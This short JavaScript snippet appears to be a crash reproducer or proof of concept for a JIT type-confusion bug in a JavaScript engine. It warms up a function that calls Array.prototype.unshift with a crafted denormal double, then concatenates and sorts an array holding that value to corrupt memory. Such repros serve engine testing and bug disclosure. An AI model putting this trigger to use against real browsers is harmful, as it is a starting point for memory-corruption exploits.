function opt(ar){
        Array.prototype.unshift(2.3023e-320)
}
ar={};
for(var xo=0;xo<20;xo++)opt([]);
for(var xo=0;xo<20;xo++)opt(ar);
for(var xo=0;xo<20;xo++)opt([]);
for(var xo=0;xo<20;xo++)opt(ar);
o31=[1.1,2.2,3.3];
o31['37']=2.3023e-320;
o51=o31.concat(false);
o51.sort();
